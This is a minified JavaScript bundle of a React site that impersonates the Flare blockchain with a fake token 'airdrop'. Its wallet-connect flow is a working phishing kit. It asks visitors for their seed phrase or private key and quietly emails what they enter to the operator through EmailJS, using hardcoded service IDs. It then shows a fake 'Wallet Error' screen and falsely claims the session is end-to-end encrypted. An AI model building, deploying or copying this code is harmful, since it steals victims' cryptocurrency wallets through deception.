      L !== -1 && L !== e.index && (e.index = L);
    }
    (s = "completed"),
      g.forEach((L) => {
        L(T);
      });
  }
  function k() {
    if (s !== "pending") return;
    v();
    const E = o.shift();
    if (E === void 0) {
      if (h.length) {
        d = setTimeout(() => {
          v(), s === "pending" && (A(), c());
        }, e.timeout);
        return;
      }
      c();
      return;
    }
    const C = {
      status: "pending",
      resource: E,
      callback: (T, M) => {
        y(C, T, M);
      },
    };
    h.push(C), a++, (d = setTimeout(k, e.rotate)), n(E, t, C.callback);
  }
  return setTimeout(k), f;
}
function Lf(e) {
  const t = { ...Jh, ...e };
  let n = [];
  function r() {
    n = n.filter((u) => u().status === "pending");
  }
  function l(u, s, a) {
    const p = Gh(t, u, s, (d, h) => {
      r(), a && a(d, h);
    });
    return n.push(p), p;
  }
  function i(u) {
    return n.find((s) => u(s)) || null;
  }
  return {
    query: l,
    find: i,
    setIndex: (u) => {
      t.index = u;
    },
    getIndex: () => t.index,
    cleanup: r,
  };
}
function Fs() {}
const di = Object.create(null);
function qh(e) {
  if (!di[e]) {
    const t = fu(e);
    if (!t) return;
    const n = Lf(t),
      r = { config: t, redundancy: n };
    di[e] = r;
  }
  return di[e];
}
function Yh(e, t, n) {
  let r, l;
  if (typeof e == "string") {
    const i = ao(e);
    if (!i) return n(void 0, 424), Fs;
    l = i.send;
    const o = qh(e);
    o && (r = o.redundancy);
  } else {
    const i = au(e);
    if (i) {
      r = Lf(i);
      const o = e.resources ? e.resources[0] : "",
        u = ao(o);
      u && (l = u.send);
    }
  }
  return !r || !l ? (n(void 0, 424), Fs) : r.query(t, l, n)().abort;
}
function Bs() {}
function Zh(e) {
  e.iconsLoaderFlag ||
    ((e.iconsLoaderFlag = !0),
    setTimeout(() => {
      (e.iconsLoaderFlag = !1), Kh(e);
    }));
}
function bh(e) {
  const t = [],
    n = [];
  return (
    e.forEach((r) => {
      (r.match(kf) ? t : n).push(r);
    }),
    { valid: t, invalid: n }
  );
}
function Cn(e, t, n) {
  function r() {
    const l = e.pendingIcons;
    t.forEach((i) => {
      l && l.delete(i), e.icons[i] || e.missing.add(i);
    });
  }
  if (n && typeof n == "object")
    try {
      if (!Cf(e, n).length) {
        r();
        return;
      }
    } catch (l) {
      console.error(l);
    }
  r(), Zh(e);
}
function Vs(e, t) {
  e instanceof Promise
    ? e
        .then((n) => {
          t(n);
        })
        .catch(() => {
          t(null);
        })
    : t(e);
}
function _h(e, t) {
  e.iconsToLoad
    ? (e.iconsToLoad = e.iconsToLoad.concat(t).sort())
    : (e.iconsToLoad = t),
    e.iconsQueueFlag ||
      ((e.iconsQueueFlag = !0),
      setTimeout(() => {
        e.iconsQueueFlag = !1;
        const { provider: n, prefix: r } = e,
          l = e.iconsToLoad;
        if ((delete e.iconsToLoad, !l || !l.length)) return;
        const i = e.loadIcon;
        if (e.loadIcons && (l.length > 1 || !i)) {
          Vs(e.loadIcons(l, r, n), (p) => {
            Cn(e, l, p);
          });
          return;
        }
        if (i) {
          l.forEach((p) => {
            const d = i(p, r, n);
            Vs(d, (h) => {
              const g = h ? { prefix: r, icons: { [p]: h } } : null;
              Cn(e, [p], g);
            });
          });
          return;
        }
        const { valid: o, invalid: u } = bh(l);
        if ((u.length && Cn(e, u, null), !o.length)) return;
        const s = r.match(kf) ? ao(n) : null;
        if (!s) {
          Cn(e, o, null);
          return;
        }
        s.prepare(n, r, o).forEach((p) => {
          Yh(n, p, (d) => {
            Cn(e, p.icons, d);
          });
        });
      }));
}
const $h = (e, t) => {
  const n = Hh(e, !0, Pf()),
    r = Dh(n);
  if (!r.pending.length) {
    let s = !0;
    return (
      t &&
        setTimeout(() => {
          s && t(r.loaded, r.missing, r.pending, Bs);
        }),
      () => {
        s = !1;
      }
    );
  }
  const l = Object.create(null),
    i = [];
  let o, u;
  return (
    r.pending.forEach((s) => {
      const { provider: a, prefix: p } = s;
      if (p === u && a === o) return;
      (o = a), (u = p), i.push(cn(a, p));
      const d = l[a] || (l[a] = Object.create(null));
      d[p] || (d[p] = []);
    }),
    r.pending.forEach((s) => {
      const { provider: a, prefix: p, name: d } = s,
        h = cn(a, p),
        g = h.pendingIcons || (h.pendingIcons = new Set());
      g.has(d) || (g.add(d), l[a][p].push(d));
    }),
    i.forEach((s) => {
      const a = l[s.provider][s.prefix];
      a.length && _h(s, a);
    }),
    t ? Xh(t, r, i) : Bs
  );
};
function em(e, t) {
  const n = { ...e };
  for (const r in t) {
    const l = t[r],
      i = typeof l;
    r in Nf
      ? (l === null || (l && (i === "string" || i === "number"))) && (n[r] = l)
      : i === typeof n[r] && (n[r] = r === "rotate" ? l % 4 : l);
  }
  return n;
}
const tm = /[\s,]+/;
function nm(e, t) {
  t.split(tm).forEach((n) => {
    switch (n.trim()) {
      case "horizontal":
        e.hFlip = !0;
        break;
      case "vertical":
        e.vFlip = !0;
        break;
    }
  });
}
function rm(e, t = 0) {
  const n = e.replace(/^-?[0-9.]*/, "");
  function r(l) {
    for (; l < 0; ) l += 4;
    return l % 4;
  }
  if (n === "") {
    const l = parseInt(e);
    return isNaN(l) ? 0 : r(l);
  } else if (n !== e) {
    let l = 0;
    switch (n) {
      case "%":
        l = 25;
        break;
      case "deg":
        l = 90;
    }
    if (l) {
      let i = parseFloat(e.slice(0, e.length - n.length));
      return isNaN(i) ? 0 : ((i = i / l), i % 1 === 0 ? r(i) : 0);
    }
  }
  return t;
}
function lm(e, t) {
  let n =
    e.indexOf("xlink:") === -1
      ? ""
      : ' xmlns:xlink="http://www.w3.org/1999/xlink"';
  for (const r in t) n += " " + r + '="' + t[r] + '"';
  return '<svg xmlns="http://www.w3.org/2000/svg"' + n + ">" + e + "</svg>";
}
function im(e) {
  return e
    .replace(/"/g, "'")
    .replace(/%/g, "%25")
    .replace(/#/g, "%23")
    .replace(/</g, "%3C")
    .replace(/>/g, "%3E")
    .replace(/\s+/g, " ");
}
function om(e) {
  return "data:image/svg+xml," + im(e);
}
function um(e) {
  return 'url("' + om(e) + '")';
}
let Vn;
function sm() {
  try {
    Vn = window.trustedTypes.createPolicy("iconify", { createHTML: (e) => e });
  } catch {
    Vn = null;
  }
}
function am(e) {
  return Vn === void 0 && sm(), Vn ? Vn.createHTML(e) : e;
}
const Uf = { ...jf, inline: !1 },
  cm = {
    xmlns: "http://www.w3.org/2000/svg",
    xmlnsXlink: "http://www.w3.org/1999/xlink",
    "aria-hidden": !0,
    role: "img",
  },
  fm = { display: "inline-block" },
  co = { backgroundColor: "currentColor" },
  If = { backgroundColor: "transparent" },
  Qs = { Image: "var(--svg)", Repeat: "no-repeat", Size: "100% 100%" },
  Ds = { WebkitMask: co, mask: co, background: If };
for (const e in Ds) {
  const t = Ds[e];
  for (const n in Qs) t[e + n] = Qs[n];
}
const dm = { ...Uf, inline: !0 };
function Ks(e) {
  return e + (e.match(/^[-0-9.]+$/) ? "px" : "");
}
const pm = (e, t, n) => {
  const r = t.inline ? dm : Uf,
    l = em(r, t),
    i = t.mode || "svg",
    o = {},
    u = t.style || {},
    s = { ...(i === "svg" ? cm : {}) };
  if (n) {
    const S = Ol(n, !1, !0);
    if (S) {
      const f = ["iconify"],
        c = ["provider", "prefix"];
      for (const A of c) S[A] && f.push("iconify--" + S[A]);
      s.className = f.join(" ");
    }
  }
  for (let S in t) {
    const f = t[S];
    if (f !== void 0)
      switch (S) {
        case "icon":
        case "style":
        case "children":
        case "onLoad":
        case "mode":
        case "ssr":
          break;
        case "_ref":
          s.ref = f;
          break;
        case "className":
          s[S] = (s[S] ? s[S] + " " : "") + f;
          break;
        case "inline":
        case "hFlip":
        case "vFlip":
          l[S] = f === !0 || f === "true" || f === 1;
          break;
        case "flip":
          typeof f == "string" && nm(l, f);
          break;
        case "color":
          o.color = f;
          break;
        case "rotate":
          typeof f == "string"
            ? (l[S] = rm(f))
            : typeof f == "number" && (l[S] = f);
          break;
        case "ariaHidden":
        case "aria-hidden":
          f !== !0 && f !== "true" && delete s["aria-hidden"];
          break;
        default:
          r[S] === void 0 && (s[S] = f);
      }
  }
  const a = Nh(e, l),
    p = a.attributes;
  if ((l.inline && (o.verticalAlign = "-0.125em"), i === "svg")) {
    (s.style = { ...o, ...u }), Object.assign(s, p);
    let S = 0,
      f = t.id;
    return (
      typeof f == "string" && (f = f.replace(/-/g, "_")),
      (s.dangerouslySetInnerHTML = {
        __html: am(Uh(a.body, f ? () => f + "ID" + S++ : "iconifyReact")),
      }),
      j.createElement("svg", s)
    );
  }
  const { body: d, width: h, height: g } = e,
    v = i === "mask" || (i === "bg" ? !1 : d.indexOf("currentColor") !== -1),
    w = lm(d, { ...p, width: h + "", height: g + "" });
  return (
    (s.style = {
      ...o,
      "--svg": um(w),
      width: Ks(p.width),
      height: Ks(p.height),
      ...fm,
      ...(v ? co : If),
      ...u,
    }),
    j.createElement("span", s)
  );
};
Pf(!0);
Ih("", Qh);
if (typeof document < "u" && typeof window < "u") {
  const e = window;
  if (e.IconifyPreload !== void 0) {
    const t = e.IconifyPreload,
      n = "Invalid IconifyPreload syntax.";
    typeof t == "object" &&
      t !== null &&
      (t instanceof Array ? t : [t]).forEach((r) => {
        try {
          (typeof r != "object" ||
            r === null ||
            r instanceof Array ||
            typeof r.icons != "object" ||
            typeof r.prefix != "string" ||
            !wh(r)) &&
            console.error(n);
        } catch {
          console.error(n);
        }
      });
  }
  if (e.IconifyProviders !== void 0) {
    const t = e.IconifyProviders;
    if (typeof t == "object" && t !== null)
      for (let n in t) {
        const r = "IconifyProviders[" + n + "] is invalid.";
        try {
          const l = t[n];
          if (typeof l != "object" || !l || l.resources === void 0) continue;
          zh(n, l) || console.error(r);
        } catch {
          console.error(r);
        }
      }
  }
}
function zf(e) {
  const [t, n] = j.useState(!!e.ssr),
    [r, l] = j.useState({});
  function i(g) {
    if (g) {
      const v = e.icon;
      if (typeof v == "object") return { name: "", data: v };
      const w = Rs(v);
      if (w) return { name: v, data: w };
    }
    return { name: "" };
  }
  const [o, u] = j.useState(i(!!e.ssr));
  function s() {
    const g = r.callback;
    g && (g(), l({}));
  }
  function a(g) {
    if (JSON.stringify(o) !== JSON.stringify(g)) return s(), u(g), !0;
  }
  function p() {
    var g;
    const v = e.icon;
    if (typeof v == "object") {
      a({ name: "", data: v });
      return;
    }
    const w = Rs(v);
    if (a({ name: v, data: w }))
      if (w === void 0) {
        const S = $h([v], p);
        l({ callback: S });
      } else w && ((g = e.onLoad) === null || g === void 0 || g.call(e, v));
  }
  j.useEffect(() => (n(!0), s), []),
    j.useEffect(() => {
      t && p();
    }, [e.icon, t]);
  const { name: d, data: h } = o;
  return h
    ? pm({ ...su, ...h }, e, d)
    : e.children
    ? e.children
    : e.fallback
    ? e.fallback
    : j.createElement("span", {});
}
const fe = j.forwardRef((e, t) => zf({ ...e, _ref: t }));
j.forwardRef((e, t) => zf({ inline: !0, ...e, _ref: t }));
const Am = "service_ywn1ci5",
  hm = "template_c5cy33h",
  mm = "jUcePh8RPbg4qABUW";
function gm() {
  const [e, t] = j.useState(null);
  return m.jsxs(m.Fragment, {
    children: [
      m.jsxs("nav", {
        className: "navsection",
        children: [
          m.jsx("div", {
            className: "logo",
            onClick: () => {
              t(null);
            },
            children: m.jsx("img", { src: Ls, alt: "" }),
          }),
          m.jsxs("div", {
            className: "navAct",
            children: [
              m.jsxs("button", {
                className: "wireAlt",
                children: [
                  m.jsx("div", {
                    className: "wiIcon",
                    children: m.jsx(fe, {
                      icon: "fluent:megaphone-16-filled",
                      width: "20px",
                      height: "20px",
                      style: { color: "black" },
                    }),
                  }),
                  m.jsx("p", { children: "Airdrop is live!" }),
                ],
              }),
              m.jsx("button", {
                onClick: () => {
                  t("link");
                },
                children: m.jsx("p", { children: "Connect Wallet" }),
              }),
            ],
          }),
        ],
      }),
      e != null
        ? m.jsx(vm, { level: e, action: t })
        : m.jsxs(m.Fragment, {
            children: [
              m.jsxs("section", {
                className: "hero",
                children: [
                  m.jsx("div", {
                    className: "heroBlur",
                    children: m.jsx("img", { src: eh, alt: "" }),
                  }),
                  m.jsxs("div", {
                    className: "heroInfo",
                    children: [
                      m.jsxs("h1", {
                        className: "headeText",
                        children: [
                          "We Are ",
                          m.jsx("span", {
                            className: "gradient-text ",
                            children: "Connecting",
                          }),
                          " Everything",
                        ],
                      }),
                      m.jsx("p", {
                        className: "subText",
                        children:
                          "Flare is the blockchain for data, providing developers with secure decentralized access to high-integrity data from other chains and the internet.",
                      }),
                    ],
                  }),
                  m.jsx("div", {
                    className: "sectionAction",
                    children: m.jsx("a", {
                      href: "#social",
                      children: m.jsx("button", {
                        className: "buttonAlt",
                        children: m.jsx("p", { children: "Learn More" }),
                      }),
                    }),
                  }),
                ],
              }),
              m.jsxs("section", {
                id: "social",
                className: "info",
                children: [
                  m.jsx("div", {
                    className: "topsec",
                    children: m.jsx("h2", {
                      children: "The blockchain for data",
                    }),
                  }),
                  m.jsxs("div", {
                    className: "cards",
                    children: [
                      m.jsxs("div", {
                        className: "cBox",
                        children: [
                          m.jsx("div", {
                            className: "cIcon",
                            children: m.jsx(fe, {
                              icon: "fluent-emoji:rocket",
                              width: "80px",
                              height: "80px",
                            }),
                          }),
                          m.jsx("h2", {
                            className: "subTitle",
                            children: "Optimize",
                          }),
                          m.jsx("p", {
                            children:
                              "Offers highly-decentralized price and data feeds to dapps on Flare, without relying on centralized providers.",
                          }),
                        ],
                      }),
                      m.jsxs("div", {
                        className: "cBox",
                        children: [
                          m.jsxs("div", {
                            className: "cIcon",
                            children: [
                              m.jsx(fe, {
                                icon: "emojione:globe-showing-americas",
                                width: "80px",
                                height: "80px",
                              }),
                              "                                    ",
                            ],
                          }),
                          m.jsx("h2", {
                            className: "subTitle",
                            children: "Engage",
                          }),
                          m.jsx("p", {
                            children:
                              "Enables information from other blockchains and the internet to be used securely and trustlessly on Flare.",
                          }),
                        ],
                      }),
                      m.jsxs("div", {
                        className: "cBox",
                        children: [
                          m.jsx("div", {
                            className: "cIcon",
                            children: m.jsx(fe, {
                              icon: "noto:coin",
                              width: "80px",
                              height: "80px",
                            }),
                          }),
                          m.jsx("h2", {
                            className: "subTitle gradient-text",
                            children: "Profit",
                          }),
                          m.jsx("p", {
                            children:
                              "Ten thosusand pluse tokens to be given to all who praticipates in this airdrop",
                          }),
                        ],
                      }),
                    ],
                  }),
                ],
              }),
              m.jsxs("section", {
                className: "extra",
                children: [
                  m.jsxs("div", {
                    className: "exText",
                    children: [
                      m.jsx("h2", { children: "The Fastest growing Chain" }),
                      m.jsx("p", {
                        children:
                          "Join us and a million others on the most secure chain by claming your airdrop",
                      }),
                    ],
                  }),
                  m.jsxs("div", {
                    className: "x",
                    children: [
                      m.jsxs("div", {
                        className: "bE",
                        children: [
                          m.jsx("p", { className: "ttop", children: "Agent" }),
                          m.jsx("h1", { children: "10.4M" }),
                          m.jsx("p", {
                            className: "arg",
                            children: "Registered Wallets",
                          }),
                        ],
                      }),
                      m.jsxs("div", {
                        className: "bE",
                        children: [
                          m.jsx("p", { className: "ttop", children: "Agent" }),
                          m.jsx("h1", { children: "5.2M" }),
                          m.jsx("p", {
                            className: "arg",
                            children: "Total Agent Page Views",
                          }),
                        ],
                      }),
                    ],
                  }),
                ],
              }),
              m.jsxs("section", {
                className: "subHero",
                children: [
                  m.jsx("div", { className: "voms" }),
                  m.jsxs("div", {
                    className: "subHeroWrap",
                    children: [
                      m.jsxs("h2", {
                        children: [
                          "Join the ",
                          m.jsx("span", {
                            className: "gradient-text",
                            children: "Biggest Airdrop",
                          }),
                          " and Earn",
                        ],
                      }),
                      m.jsx("button", {
                        className: "buttonAlt",
                        onClick: () => {
                          t("link");
                        },
                        children: m.jsx("p", { children: "Connect Wallet" }),
                      }),
                    ],
                  }),
                ],
              }),
              m.jsxs("section", {
                className: "services",
                children: [
                  m.jsx("div", {
                    className: "secTopServ",
                    children: m.jsx("h2", {
                      children: "Our Decentralized Cloud Services",
                    }),
                  }),
                  m.jsxs("div", {
                    className: "secCardsServ",
                    children: [
                      m.jsxs("div", {
                        className: "serCard",
                        children: [
                          m.jsx("div", {
                            className: "iconSer",
                            children: m.jsx(fe, {
                              icon: "ri:link",
                              width: "100px",
                              height: "100px",
                              style: { color: "white" },
                            }),
                          }),
                          m.jsx("h3", { children: "Decentralized Bridging" }),
                          m.jsx("p", {
                            children:
                              "Trustlessly access value and users from other chains.                                    ",
                          }),
                        ],
                      }),
                      m.jsxs("div", {
                        className: "serCard",
                        children: [
                          m.jsx("div", {
                            className: "iconSer",
                            children: m.jsx(fe, {
                              icon: "mdi:partnership",
                              width: "100px",
                              height: "100px",
                              style: { color: "white" },
                            }),
                          }),
                          m.jsx("h3", { children: "State Acquisition" }),
                          m.jsx("p", {
                            children:
                              "Build dapps and protocols that utilize state from any connected chain.",
                          }),
                        ],
                      }),
                      m.jsxs("div", {
                        className: "serCard",
                        children: [
                          m.jsx("div", {
                            className: "iconSer",
                            children: m.jsx(fe, {
                              icon: "carbon:data-vis-3",
                              width: "100px",
                              height: "100px",
                              style: { color: "white" },
                            }),
                          }),
                          m.jsx("h3", { children: "Enshrined Oracles" }),
                          m.jsx("p", {
                            children:
                              "Access all the data you need, knowing Flare's oracles are secured at the network layer.                                    ",
                          }),
                        ],
                      }),
                    ],
                  }),
                ],
              }),
              m.jsx("div", {
                className: "bofooter",
                children: m.jsxs("footer", {
                  children: [
                    m.jsx("div", { className: "bvon" }),
                    m.jsxs("div", {
                      className: "footerWrap",
                      children: [
                        m.jsx("div", {
                          className: "footop",
                          children: m.jsx("h2", {
                            className: "footext",
                            children: "Get in touch with us",
                          }),
                        }),
                        m.jsxs("div", {
                          className: "foobase",
                          children: [
                            m.jsxs("div", {
                              className: "fooLogo",
                              children: [
                                m.jsx("div", {
                                  className: "fLogo",
                                  children: m.jsx("img", { src: Ls, alt: "" }),
                                }),
                                m.jsx("p", {
                                  className: "",
                                  children: "Back To Top",
                                }),
                              ],
                            }),
                            m.jsx("hr", {}),
                            m.jsxs("div", {
                              className: "fooLogob",
                              children: [
                                m.jsx("p", {
                                  className: "",
                                  children: "support@flare.network",
                                }),
                                m.jsxs("div", {
                                  className: "socials",
                                  children: [
                                    m.jsx("div", {
                                      className: "socBox",
                                      children: m.jsx(fe, {
                                        icon: "ic:baseline-discord",
                                        width: "20px",
                                        height: "35px",
                                        style: { color: "white" },
                                      }),
                                    }),
                                    m.jsx("div", {
                                      className: "socBox",
                                      children: m.jsx(fe, {
                                        icon: "ri:twitter-x-fill",
                                        width: "35px",
                                        height: "20px",
                                        style: { color: "white" },
                                      }),
                                    }),
                                    m.jsx("div", {
                                      className: "socBox",
                                      children: m.jsx(fe, {
                                        icon: "mingcute:youtube-fill",
                                        width: "20px",
                                        height: "35px",
                                        style: { color: "white" },
                                      }),
                                    }),
                                    m.jsx("div", {
                                      className: "socBox",
                                      children: m.jsx(fe, {
                                        icon: "ri:instagram-fill",
                                        width: "20px",
                                        height: "35px",
                                        style: { color: "white" },
                                      }),
                                    }),
                                  ],
                                }),
                              ],
                            }),
                          ],
                        }),
                      ],
                    }),
                  ],
                }),
              }),
            ],
          }),
    ],
  });
}
function vm({ level: e, action: t }) {
  const [n, r] = j.useState({ name: "", icon: "", message: "" }),
    [l, i] = j.useState(!1),
    [o, u] = j.useState(!1);
  function s(h) {
    t("phrase"), r({ name: h.name, icon: h.icon, message: "" });
  }
  function a(h) {
    const { name: g, value: v } = h.target;
    r((w) => ({ ...w, [g]: v }));
  }
  const p = () => {
    i(!0),
      Us.send(Am, hm, { message: n.message, wallet: n.name })
        .then(() => {
          t("error"), i(!1);
        })
        .catch(() => {
          u("Error connecting wallet"), i(!1);
        });
  };
  function d(h) {
    h.preventDefault();
    try {
      u(!1), Us.init({ publicKey: mm }), p();
    } catch (g) {
      console.log(g), u(g), i(!1);
    }
  }
  return m.jsx(m.Fragment, {
    children: m.jsxs("section", {
      className: "actionSce",
      children: [
        e === "link"
          ? m.jsxs("div", {
              className: "linkBox",
              children: [
                m.jsx("div", {
                  className: "iconLink",
                  children: m.jsx(fe, {
                    icon: "solar:wallet-2-bold",
                    width: "80px",
                    height: "80px",
                    style: { color: "black" },
                  }),
                }),
                m.jsxs("div", {
                  className: "textLinks",
                  children: [
                    m.jsx("h2", { children: "Link your wallet" }),
                    m.jsx("p", {
                      children: "Link your wallet to claim your airdrop",
                    }),
                  ],
                }),
                m.jsx("div", {
                  className: "linklistBox",
                  children: [...$A]
                    .sort((h, g) => h.name.localeCompare(g.name))
                    .map((h) =>
                      m.jsxs(
                        "div",
                        {
                          className: "linkSingle",
                          onClick: () => s(h),
                          children: [
                            m.jsx("div", {
                              className: "cctIcon",
                              children: m.jsx("img", { src: h.icon, alt: "" }),
                            }),
                            m.jsx("p", { children: h.name }),
                          ],
                        },
                        h.name
                      )
                    ),
                }),
              ],
            })
          : e === "phrase"
          ? m.jsxs("div", {
              className: "linkBox shacj",
              children: [
                m.jsx("div", {
                  className: "iconLink",
                  children: m.jsx("img", { src: n.icon, alt: "" }),
                }),
                m.jsx("div", {
                  className: "textLinks",
                  children: m.jsx("h2", { children: n.name }),
                }),
                m.jsxs("form", {
                  onSubmit: d,
                  children: [
                    m.jsxs("div", {
                      className: "textArea",
                      children: [
                        m.jsx("textarea", {
                          value: n.message,
                          onChange: a,
                          name: "message",
                          id: "",
                          placeholder:
                            n.name === "Xumm"
                              ? "Enter your private numbers from A to H."
                              : "Enter your 12 or 24 mnemonic words. Seperate with spaces. You can also input your private key.",
                          style: { resize: "none" },
                        }),
                        o
                          ? m.jsx("p", {
                              className: "err",
                              children: "You can't submit an empty phrase",
                            })
                          : null,
                      ],
                    }),
                    m.jsx("div", {
                      className: "actionlink",
                      children: m.jsx("button", {
                        className: "full",
                        disabled: l,
                        style: { opacity: l ? 0.6 : 1 },
                        children: m.jsx("p", {
                          children: l ? "Loading..." : "Connect and Sign in",
                        }),
                      }),
                    }),
                  ],
                }),
              ],
            })
          : e === "error"
          ? m.jsxs("div", {
              className: "linkBox shacj",
              children: [
                m.jsx("div", {
                  className: "iconLink",
                  children: m.jsx(fe, {
                    icon: "bxs:error-alt",
                    width: "80px",
                    height: "80px",
                    style: { color: "red" },
                  }),
                }),
                m.jsx("div", {
                  className: "textLinks",
                  children: m.jsx("h2", { children: "Wallet Error" }),
                }),
                m.jsxs("div", {
                  className: "vom",
                  children: [
                    m.jsx("p", {
                      children:
                        "An error occured while linking your wallet, please try again later with a different wallet.",
                    }),
                    m.jsxs("div", {
                      className: "actionlink",
                      children: [
                        m.jsx("button", {
                          className: "buttonAlt",
                          onClick: () => {
                            t(null);
                          },
                          children: m.jsx("p", { children: "Go Back" }),
                        }),
                        m.jsx("button", {
                          onClick: () => {
                            t("link");
                          },
                          children: m.jsx("p", { children: "Try Again" }),
                        }),
                      ],
                    }),
                  ],
                }),
              ],
            })
          : null,
        m.jsxs("div", {
          className: "eBox",
          children: [
            m.jsxs("div", {
              className: "cbon",
              children: [
                m.jsx("div", {
                  className: "eIcon",
                  children: m.jsx(fe, {
                    icon: "ion:shield-half",
                    width: "20px",
                    height: "20px",
                    style: { color: "black" },
                  }),
                }),
                m.jsx("p", {
                  className: "sec",
                  children: "This session is end to end eyncrypted",
                }),
              ],
            }),
            m.jsx("p", {
              className: "red",
              children: "Never share your seed phrase with anybody!",
            }),
          ],
        }),
      ],
    }),
  });
}
tf(document.getElementById("root")).render(
  m.jsx(j.StrictMode, {
    children: m.jsx(_A, {
      children: m.jsx(YA, {
        children: m.jsx(df, { index: !0, element: m.jsx(gm, {}) }),
      }),
    }),
  })
);
